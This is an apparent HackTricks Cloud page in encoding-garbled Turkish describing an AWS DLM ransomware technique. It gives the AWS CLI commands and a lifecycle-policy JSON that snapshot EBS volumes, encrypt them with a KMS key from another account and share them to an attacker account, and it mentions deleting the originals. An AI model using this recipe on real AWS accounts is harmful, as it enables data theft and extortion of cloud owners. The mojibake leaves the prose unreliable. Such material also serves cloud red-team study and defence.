# AWS - DLM Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Data Lifecycle Manger (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

Bir fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±sÄ±, mÃ¼mkÃ¼n olduÄŸunca Ã§ok EBS hacmini ÅŸifreleyerek ve ardÄ±ndan mevcut EC2 Ã¶rneklerini, EBS hacimlerini ve anlÄ±k gÃ¶rÃ¼ntÃ¼leri silerek gerÃ§ekleÅŸtirilebilir. Bu kÃ¶tÃ¼ niyetli etkinliÄŸi otomatikleÅŸtirmek iÃ§in, baÅŸka bir AWS hesabÄ±ndan bir KMS anahtarÄ± ile anlÄ±k gÃ¶rÃ¼ntÃ¼leri ÅŸifreleyerek ve ÅŸifrelenmiÅŸ anlÄ±k gÃ¶rÃ¼ntÃ¼leri farklÄ± bir hesaba aktararak Amazon DLM kullanÄ±labilir. Alternatif olarak, ÅŸifrelenmemiÅŸ anlÄ±k gÃ¶rÃ¼ntÃ¼leri yÃ¶nettikleri bir hesaba aktarabilir ve ardÄ±ndan orada ÅŸifreleyebilirler. Mevcut EBS hacimlerini veya anlÄ±k gÃ¶rÃ¼ntÃ¼leri doÄŸrudan ÅŸifrelemek kolay olmasa da, yeni bir hacim veya anlÄ±k gÃ¶rÃ¼ntÃ¼ oluÅŸturarak bunu yapmak mÃ¼mkÃ¼ndÃ¼r.

Ã–ncelikle, Ã¶rnek ID'si, hacim ID'si, ÅŸifreleme durumu, ekleme durumu ve hacim tÃ¼rÃ¼ gibi hacimlerle ilgili bilgileri toplamak iÃ§in bir komut kullanÄ±lacaktÄ±r.

`aws ec2 describe-volumes`

Ä°kincisi, yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ±nÄ± oluÅŸturacaktÄ±r. Bu komut, belirli hacimlerin her gÃ¼n belirli bir saatte otomatik olarak anlÄ±k gÃ¶rÃ¼ntÃ¼lerini alan bir yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± kurmak iÃ§in DLM API'sini kullanÄ±r. AyrÄ±ca anlÄ±k gÃ¶rÃ¼ntÃ¼lere belirli etiketler uygular ve hacimlerden anlÄ±k gÃ¶rÃ¼ntÃ¼lere etiketleri kopyalar. policyDetails.json dosyasÄ±, hedef etiketler, program, ÅŸifreleme iÃ§in isteÄŸe baÄŸlÄ± KMS anahtarÄ±nÄ±n ARN'si ve anlÄ±k gÃ¶rÃ¼ntÃ¼ paylaÅŸÄ±mÄ± iÃ§in hedef hesap gibi yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ±nÄ±n ayrÄ±ntÄ±larÄ±nÄ± iÃ§erir; bu bilgiler kurbanÄ±n CloudTrail gÃ¼nlÃ¼klerinde kaydedilecektir.
```bash
aws dlm create-lifecycle-policy --description "My first policy" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json
```
Bir politika belgesi iÃ§in ÅŸablon burada gÃ¶rÃ¼lebilir:
```bash
{
"PolicyType": "EBS_SNAPSHOT_MANAGEMENT",
"ResourceTypes": [
"VOLUME"
],
"TargetTags": [
{
"Key": "ExampleKey",
"Value": "ExampleValue"
}
],
"Schedules": [
{
"Name": "DailySnapshots",
"CopyTags": true,
"TagsToAdd": [
{
"Key": "SnapshotCreator",
"Value": "DLM"
}
],
"VariableTags": [
{
"Key": "CostCenter",
"Value": "Finance"
}
],
"CreateRule": {
"Interval": 24,
"IntervalUnit": "HOURS",
"Times": [
"03:00"
]
},
"RetainRule": {
"Count": 14
},
"FastRestoreRule": {
"Count": 2,
"Interval": 12,
"IntervalUnit": "HOURS"
},
"CrossRegionCopyRules": [
{
"TargetRegion": "us-west-2",
"Encrypted": true,
"CmkArn": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
"CopyTags": true,
"RetainRule": {
"Interval": 1,
"IntervalUnit": "DAYS"
}
}
],
"ShareRules": [
{
"TargetAccounts": [
"123456789012"
],
"UnshareInterval": 30,
"UnshareIntervalUnit": "DAYS"
}
]
}
],
"Parameters": {
"ExcludeBootVolume": false
}
}
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
